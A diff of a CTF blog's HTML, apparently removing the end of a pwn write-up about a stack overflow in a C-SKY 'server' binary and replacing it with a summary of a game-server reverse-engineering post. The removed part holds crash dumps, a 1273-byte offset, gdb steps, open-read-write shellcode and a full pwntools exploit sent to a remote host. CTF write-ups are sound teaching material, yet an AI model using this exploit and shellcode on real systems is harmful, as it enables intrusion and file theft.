-[ 3167.454613] r12: 0x00000001  r13: 0x00000001  r15: 0x61616161
-[ 3167.455078] r16: 0x00000000  r17: 0x0053e558  r18: 0x00163568  r19: 0x00000000
-[ 3167.455406] r20: 0x0013fceb  r21: 0x0000000a  r22: 0x00000001  r23: 0x00000001
-[ 3167.456234] r24: 0x01b53478  r25: 0x00000054  r26: 0x77e159f0  r27: 0x00000000
-[ 3167.456546] r28: 0x77ec1000  r29: 0x00000000  r30: 0x00000000  tls: 0x01b53478
-[ 3167.457641]  hi: 0x00000000   lo: 0x00000000</code></pre></div>
-
-
-
-<p>The pc register has been hijacked successfully! <strong>Stack overflow is real</strong>!</p>
-
-
-
-<p>After some testing we can confirm we need exactly 1273 bytes of &#8220;a&#8221; to reach the final PC hijack point.</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-python" data-lang="Python"><code>test = b&#39;Oclient_port&#39; + b&#39;a&#39; * 1273+p32(0x12345678) + b&#39;\r\n&#39;</code></pre></div>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>[ 3349.657774] server[125]: unhandled signal 11 code 0x1 at 0x12345000
-[ 3349.661123] 
-[ 3349.661123] CURRENT PROCESS:
-[ 3349.661123] 
-[ 3349.661832] COMM=server PID=125
-[ 3349.662149] TEXT=00008000-00138090 DATA=0013976c-0013f4e8 BSS=0013f4e8-01b75000
-[ 3349.662476] USER-STACK=7f860e60  KERNEL-STACK=817a8840
-[ 3349.662476] 
-[ 3349.663194] PC: 0x12345678 (0x12345678)
-[ 3349.663965] LR: 0x12345678 (0x12345678)
-[ 3349.664348] SP: 0x7f860800
-[ 3349.664758] PSR: 0x00140341
-[ 3349.664962] orig_a0: 0x00000000
-[ 3349.665287] PT_REGS: 0x81d91f68
-[ 3349.665508]  a0: 0x00000000   a1: 0x00000000   a2: 0x00163568   a3: 0x00000000
-[ 3349.666069]  r4: 0x7f860f00   r5: 0x00000320   r6: 0x00000000   r7: 0x00000000
-[ 3349.666593]  r8: 0x61616161   r9: 0x0053e45c  r10: 0x000ec6fc  r11: 0x00000001
-[ 3349.667269] r12: 0x00000001  r13: 0x00000001  r15: 0x12345678
-[ 3349.667749] r16: 0x00000000  r17: 0x0053e558  r18: 0x00163568  r19: 0x00000000
-[ 3349.668210] r20: 0x0013fa18  r21: 0x0000000a  r22: 0x00000001  r23: 0x00000001
-[ 3349.668644] r24: 0x01b53478  r25: 0x00000054  r26: 0x77e159f0  r27: 0x00000000
-[ 3349.669210] r28: 0x77ec1000  r29: 0x00000000  r30: 0x00000000  tls: 0x01b53478
-[ 3349.669679]  hi: 0x00000000   lo: 0x00000000</code></pre></div>
-
-
-
-<p>Don&#8217;t do ROP too fast, let&#8217;s check target&#8217;s maps.</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code># cat /proc/122/maps
-00008000-00139000 r-xp 00000000 fe:00 10162      /server
-00139000-00140000 rw-p 00130000 fe:00 10162      /server
-00140000-00164000 rwxp 00000000 00:00 0 
-01b53000-01b75000 rwxp 00000000 00:00 0          [heap]
-77f4a000-77f4c000 r-xp 00000000 00:00 0          [vdso]
-77f4c000-77f4d000 r--p 00000000 00:00 0 
-7f840000-7f861000 rwxp 00000000 00:00 0          [stack]</code></pre></div>
-
-
-
-<p><strong>Target has no NX/ASLR enabled!</strong></p>
-
-
-
-<p>So we just need to jmp esp&#8230;..Oh wait.</p>
-
-
-
-<h2 id="0x6-debugging-and-shellcoding">0x6 Debugging and shellcoding</h2>
-
-
-
-<p>We haven&#8217;t use any gdb till now, we have 2 options to exploit this bug:</p>
-
-
-
-<ul>
-<li>Eliminate any \x00\r\n in shellcode, directly jump to stack.</li>
-<li>Find something interesting in fixed address and jump</li>
-</ul>
-
-
-
-<p>I&#8217;ve considered first solution and not only it is very tedious, but also we don&#8217;t know if zerofree shellcode is possible.</p>
-
-
-
-<p>So let&#8217;s check if we can find something interesting in gdb.</p>
-
-
-
-<p>Create a gdb file first, because this gdb is very primitive, you need to add some juice.</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>define hook-stop
-info registers
-x/24wx  $sp
-x/5i  $pc
-end
-set follow-fork-mode child
-target remote 192.168.101.23:2222</code></pre></div>
-
-
-
-<p><em>Tips: if you encounter some error while running gdb, try add lib path to LD_LIBRARY_PATH</em></p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>export LD_LIBRARY_PATH=/your/path/csky-toolchain/host/lib</code></pre></div>
-
-
-
-<p>And let&#8217;s connect our gdb to gdbserver, run this in guest:</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>/gdbserver --attach 0.0.0.0:2222 &lt;your server pid&gt; &</code></pre></div>
-
-
-
-<p>Run our primitive gdb in host:</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>./csky-linux-gdb -x &lt;your gdb script file&gt;</code></pre></div>
-
-
-
-<p>You&#8217;ll see something similar to this if you trigger overflow again.</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>Thread 2.1 &quot;server&quot; received signal SIGSEGV, Segmentation fault.
-r0             0x0	0
-r1             0x0	0
-r2             0x163568	1455464
-r3             0x0	0
-r4             0x7fd46f00	2144628480
-r5             0x320	800
-r6             0x0	0
-r7             0x0	0
-r8             0x61616161	1633771873
-r9             0x53e45c	5497948
-r10            0xec6fc	968444
-r11            0x1	1
-r12            0x1	1
-r13            0x1	1
-r14            0x7fd46800	0x7fd46800
-r15            0x12345678	305419896
-r16            0x0	0
-r17            0x53e558	5498200
-r18            0x163568	1455464
-r19            0x0	0
-r20            0x13fa18	1309208
-r21            0xa	10
-r22            0x1	1
-r23            0x1	1
-r24            0xbdb478	12432504
-r25            0x54	84
-r26            0x77e159f0	2011257328
-r27            0x0	0
-r28            0x77ec1000	2011959296
-r29            0x0	0
-r30            0x0	0
-r31            0x0	0
-pc             0x12345678	0x12345678
-epc            &lt;unavailable&gt;
-psr            0x140341	1311553
-epsr           &lt;unavailable&gt;
-0x7fd46800:	0x0000050b	0x001436e8	0x7fd46848	0x7fd46824
-0x7fd46810:	0x0000a5ac	0x00000190	0x7fd46848	0x00000004
-0x7fd46820:	0x0000050b	0x7fd46d34	0x000083c0	0x000001c2
-0x7fd46830:	0x000001c2	0x00000320	0x7fd46f4f	0x00000004
-0x7fd46840:	0x00bdb478	0x00000348	0x7fd40000	0xeb8b4567
-0x7fd46850:	0x00000004	0xffffffff	0x00000000	0x00000000
-=&gt; 0x12345678:	Error while running hook_stop:
-Cannot access memory at address 0x12345678
-0x12345678 in ?? ()</code></pre></div>
-
-
-
-<p>Can you spot $r20 is interesting? It points to somewhere in data/bss segment, they have fixed address because no ASLR.</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>(cskygdb) x/20bx 0x13fa18
-0x13fa18:	0x12	0x00	0x0a	0x00	0x00	0x00	0x00	0x00
-0x13fa20:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
-0x13fa28:	0x00	0x00	0x00	0x00
-(cskygdb)  x/20bx 0x13fa10
-0x13fa10:	0x61	0x61	0x61	0x61	0x61	0x78	0x56	0x34
-0x13fa18:	0x12	0x00	0x0a	0x00	0x00	0x00	0x00	0x00
-0x13fa20:	0x00	0x00	0x00	0x00</code></pre></div>
-
-
-
-<p>Our packet is stored in <strong>FIXED ADDRESS!</strong></p>
-
-
-
-<p>So here the solution is very obvious, control pc&#8211;&gt;ret to fixed packet address &#8211;&gt; shellcode!</p>
-
-
-
-<p>How to generate this weird arch shellcode? Fortunately we have a gcc built in our toolchain, so just static compile your code, dump assembly by readelf and craft your shellcode. <em>Talk is easy, you&#8217;ll find it very time-consuming and feel frustrated.</em></p>
-
-
-
-<p>FYFI here&#8217;s the shellcode I used:</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code># shellcode for open read write
-subi              sp, sp, 12
-st.w              r8, (sp, 0)
-st.w              r15, (sp, 0x4)
-st.w              r4, (sp, 0x8)
-mov              r8, sp
-subi              sp, sp, 276
-subi              r3, r8, 20
-movi              r2, 47
-st.b              r2, (r3, 0)
-subi              r3, r8, 20
-movi              r2, 102
-st.b              r2, (r3, 0x1)
-subi              r3, r8, 20
-movi              r2, 108
-st.b              r2, (r3, 0x2)
-subi              r3, r8, 20
-movi              r2, 97
-st.b              r2, (r3, 0x3)
-subi              r3, r8, 20
-movi              r2, 103
-st.b              r2, (r3, 0x4)
-subi              r3, r8, 20
-movi              r2, 0
-st.b              r2, (r3, 0x5)
-subi              r4, r8, 4
-subi              r3, r8, 20
-movi              r0, 0
-mov              r1, r3
-subi              r0, 100
-movi              r7, 56
-trap              0
-
-lsli              r0, r0, 0
-st.w              r0, (r4, 0)
-subi              r1, r8, 276
-subi              r3, r8, 4
-movi              r2, 256
-ld.w              r0, (r3, 0)
-movi              r7, 63
-trap              0
-
-lsli              r0, r0, 0
-subi              r3, r8, 276
-movi              r2, 4096
-mov              r1, r3
-movi              r0, 4
-movi              r7, 64
-trap              0</code></pre></div>
-
-
-
-<p>Why use open-read-write? Because u cannot communicate if u popped a shell in forked process, unless you dup some socket to 0,1,2, I chose not to do that.</p>
-
-
-
-<h2 id="0x7-final-exploit">0x7 Final exploit</h2>
-
-
-
-<p>Here&#8217;s my final exploit:</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-python" data-lang="Python"><code>from pwn import *
-
-debug = 0
-context.log_level = &#39;debug&#39;
-# 0x000093fc 0x9270 0x9294
-base = 0x13f510
-if debug:
-    p = remote(&#39;192.168.101.23&#39;, 8554)
-else:
-    p = remote(&#39;47.242.246.203&#39;, 32042)
-
-sc = [
-    0x23, 0x14, 0x0E, 0xDD, 0x00, 0x20, 0xEE, 0xDD, 0x01, 0x20, 0x82, 0xB8, 0x3B, 0x6E, 0x25, 0x16,
-    0x68, 0xE4, 0x13, 0x10, 0x2F, 0x32, 0x40, 0xA3, 0x68, 0xE4, 0x13, 0x10, 0x66, 0x32, 0x41, 0xA3,
-    0x68, 0xE4, 0x13, 0x10, 0x6C, 0x32, 0x42, 0xA3, 0x68, 0xE4, 0x13, 0x10, 0x61, 0x32, 0x43, 0xA3,
-    0x68, 0xE4, 0x13, 0x10, 0x67, 0x32, 0x44, 0xA3, 0x68, 0xE4, 0x13, 0x10, 0x00, 0x32, 0x45, 0xA3,
-    0x88, 0xE4, 0x03, 0x10, 0x68, 0xE4, 0x13, 0x10, 0x00, 0x30, 0x4F, 0x6C, 0x63, 0x28, 0x38, 0x37,
-    0x00, 0xC0, 0x20, 0x20, 0x00, 0x40, 0x00, 0xB4, 0x28, 0xE4, 0x13, 0x11, 0x68, 0xE4, 0x03, 0x10,
-    0x02, 0xEA, 0x00, 0x01, 0x00, 0x93, 0x3F, 0x37, 0x00, 0xC0, 0x20, 0x20, 0x00, 0x40, 0x68, 0xE4,
-    0x13, 0x11, 0x02, 0xEA, 0x00, 0x10, 0x4F, 0x6C, 0x04, 0x30, 0x40, 0x37, 0x00, 0xC0, 0x20, 0x20,
-    0x00, 0x6C, 0xA3, 0x6F, 0x82, 0x98, 0xEE, 0xD9, 0x01, 0x20, 0x0E, 0xD9, 0x00, 0x20, 0x03, 0x14,
-
-    # useless shellcode just for stucking process, popping a sh lol.
-    0x22, 0x14, 0x0E, 0xDD, 0x00, 0x20, 0xEE, 0xDD, 0x01, 0x20, 0x3B, 0x6E, 0x2A, 0x14, 0x68, 0xE4,
-    0x0F, 0x10, 0x2F, 0x32, 0x40, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x62, 0x32, 0x41, 0xA3, 0x68, 0xE4,
-    0x0F, 0x10, 0x69, 0x32, 0x42, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x6E, 0x32, 0x43, 0xA3, 0x68, 0xE4,
-    0x0F, 0x10, 0x2F, 0x32, 0x44, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x62, 0x32, 0x45, 0xA3, 0x68, 0xE4,
-    0x0F, 0x10, 0x75, 0x32, 0x46, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x73, 0x32, 0x47, 0xA3, 0x68, 0xE4,
-    0x0F, 0x10, 0x79, 0x32, 0x48, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x62, 0x32, 0x49, 0xA3, 0x68, 0xE4,
-    0x0F, 0x10, 0x6F, 0x32, 0x4A, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x78, 0x32, 0x4B, 0xA3, 0x68, 0xE4,
-    0x0F, 0x10, 0x00, 0x32, 0x4C, 0xA3, 0x68, 0xE4, 0x17, 0x10, 0x73, 0x32, 0x40, 0xA3, 0x68, 0xE4,
-    0x17, 0x10, 0x68, 0x32, 0x41, 0xA3, 0x68, 0xE4, 0x17, 0x10, 0x00, 0x32, 0x42, 0xA3, 0x68, 0xE4,
-    0x23, 0x10, 0x48, 0xE4, 0x0F, 0x10, 0x40, 0xB3, 0x68, 0xE4, 0x23, 0x10, 0x48, 0xE4, 0x17, 0x10,
-    0x41, 0xB3, 0x68, 0xE4, 0x23, 0x10, 0x00, 0x32, 0x42, 0xB3, 0x68, 0xE4, 0x27, 0x10, 0x00, 0x32,
-    0x40, 0xB3, 0x48, 0xE4, 0x27, 0x10, 0x28, 0xE4, 0x23, 0x10, 0x68, 0xE4, 0x0F, 0x10, 0x0F, 0x6C,
-    0xE0, 0xB8, 0xDD, 0x37, 0x00, 0xC0, 0x20, 0x20, 0x02, 0x14, 0x3C, 0x78
-]
-
-test = b&#39;Oclient_port&#39; + b&#39;a&#39; * 1273 + p32(0x13fa1c)[:3] + b&#39;\r\nbb&#39; + bytearray(sc) + b&#39;\r\n&#39;
-
-p.send(test)
-p.interactive()</code></pre></div>
-
-
-
-<p>What a long post, thank you!</p>
-
-
-
-<p></p>
-		</div>
+			<div class="entry-summary" itemprop="text">
+				<p>Did you know why you just cannot get perfect artifacts?</p>
+			</div>
 
 				<footer class="entry-meta" aria-label="Entry meta">
-			<span class="cat-links"><span class="gp-icon icon-categories"><svg viewbox="0 0 512 512" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M0 112c0-26.51 21.49-48 48-48h110.014a48 48 0 0143.592 27.907l12.349 26.791A16 16 0 00228.486 128H464c26.51 0 48 21.49 48 48v224c0 26.51-21.49 48-48 48H48c-26.51 0-48-21.49-48-48V112z"></path></svg></span><span class="screen-reader-text">Categories </span><a href="https://pwnblog.github.io/category/writeups/" rel="category tag">writeups</a></span> 		<nav id="nav-below" class="post-navigation" aria-label="Posts">
-			<div class="nav-next">
-<span class="gp-icon icon-arrow-right"><svg viewbox="0 0 192 512" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414"><path d="M178.425 256.001c0 2.266-1.133 4.815-2.832 6.515L43.599 394.509c-1.7 1.7-4.248 2.833-6.514 2.833s-4.816-1.133-6.515-2.833l-14.163-14.162c-1.699-1.7-2.832-3.966-2.832-6.515 0-2.266 1.133-4.815 2.832-6.515l111.317-111.316L16.407 144.685c-1.699-1.7-2.832-4.249-2.832-6.515s1.133-4.815 2.832-6.515l14.163-14.162c1.7-1.7 4.249-2.833 6.515-2.833s4.815 1.133 6.514 2.833l131.994 131.993c1.7 1.7 2.832 4.249 2.832 6.515z" fill-rule="nonzero"></path></svg></span><span class="next"><a href="https://pwnblog.github.io/2022/02/15/0ctf-2021-quals-ioa-writeup/" rel="next">0CTF 2021 Quals &#8220;ioa&#8221; writeup</a></span>
-</div>		</nav>
-				</footer>
+			<span class="cat-links"><span class="gp-icon icon-categories"><svg viewbox="0 0 512 512" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M0 112c0-26.51 21.49-48 48-48h110.014a48 48 0 0143.592 27.907l12.349 26.791A16 16 0 00228.486 128H464c26.51 0 48 21.49 48 48v224c0 26.51-21.49 48-48 48H48c-26.51 0-48-21.49-48-48V112z"></path></svg></span><span class="screen-reader-text">Categories </span><a href="https://pwnblog.github.io/category/rev/" rel="category tag">reverse-engineering</a></span> <span class="comments-link"><span class="gp-icon icon-comments"><svg viewbox="0 0 512 512" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M132.838 329.973a435.298 435.298 0 0016.769-9.004c13.363-7.574 26.587-16.142 37.419-25.507 7.544.597 15.27.925 23.098.925 54.905 0 105.634-15.311 143.285-41.28 23.728-16.365 43.115-37.692 54.155-62.645 54.739 22.205 91.498 63.272 91.498 110.286 0 42.186-29.558 79.498-75.09 102.828 23.46 49.216 75.09 101.709 75.09 101.709s-115.837-38.35-154.424-78.46c-9.956 1.12-20.297 1.758-30.793 1.758-88.727 0-162.927-43.071-181.007-100.61z"></path><path d="M383.371 132.502c0 70.603-82.961 127.787-185.216 127.787-10.496 0-20.837-.639-30.793-1.757-38.587 40.093-154.424 78.429-154.424 78.429s51.63-52.472 75.09-101.67c-45.532-23.321-75.09-60.619-75.09-102.79C12.938 61.9 95.9 4.716 198.155 4.716 300.41 4.715 383.37 61.9 383.37 132.502z"></path></svg></span><a href="https://pwnblog.github.io/2022/10/28/genshin-impact-server-reverse-engineering-part-1-artifacts/#respond"><span class="dsq-postid" data-dsqidentifier="117 http://127.0.0.1/fuck/?p=117">Leave a comment</span></a></span> 		</footer>
 			</div>
 </article>
 		</main>
@@ -823,8 +130,8 @@ p.interactive()</code></pre></div>
 <h2 id="post-categories">Post Categories</h2>
 
 
-<ul class="wp-block-categories-list wp-block-categories">	<li class="cat-item cat-item-4">
-<a href="https://pwnblog.github.io/category/rev/" title="Life is boring without reverse-engineering">reverse-engineering</a>
+<ul class="wp-block-categories-list wp-block-categories">	<li class="cat-item cat-item-4 current-cat">
+<a aria-current="page" href="https://pwnblog.github.io/category/rev/" title="Life is boring without reverse-engineering">reverse-engineering</a>
 </li>
 	<li class="cat-item cat-item-3">
 <a href="https://pwnblog.github.io/category/writeups/" title="Some writeups for ctf I played">writeups</a>
@@ -849,6 +156,8 @@ p.interactive()</code></pre></div>
 
 <script id="generate-a11y">!function(){"use strict";if("querySelector"in document&&"addEventListener"in window){var e=document.body;e.addEventListener("mousedown",function(){e.classList.add("using-mouse")}),e.addEventListener("keydown",function(){e.classList.remove("using-mouse")})}}();</script><style>.wp-container-1 > .alignleft { float: left; margin-inline-start: 0; margin-inline-end: 2em; }.wp-container-1 > .alignright { float: right; margin-inline-start: 2em; margin-inline-end: 0; }.wp-container-1 > .aligncenter { margin-left: auto !important; margin-right: auto !important; }</style>
 <style>.wp-container-2 > .alignleft { float: left; margin-inline-start: 0; margin-inline-end: 2em; }.wp-container-2 > .alignright { float: right; margin-inline-start: 2em; margin-inline-end: 0; }.wp-container-2 > .aligncenter { margin-left: auto !important; margin-right: auto !important; }</style>
+<script id="disqus_count-js-extra">var countVars = {"disqusShortname":"pwnblog"};</script>
+<script src="https://pwnblog.github.io/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.22" id="disqus_count-js"></script>
 <!--[if lte IE 11]>
 <script src='http://127.0.0.1/fuck/wp-content/themes/generatepress/assets/js/classList.min.js?ver=3.2.1' id='generate-classlist-js'></script>
 <![endif]-->
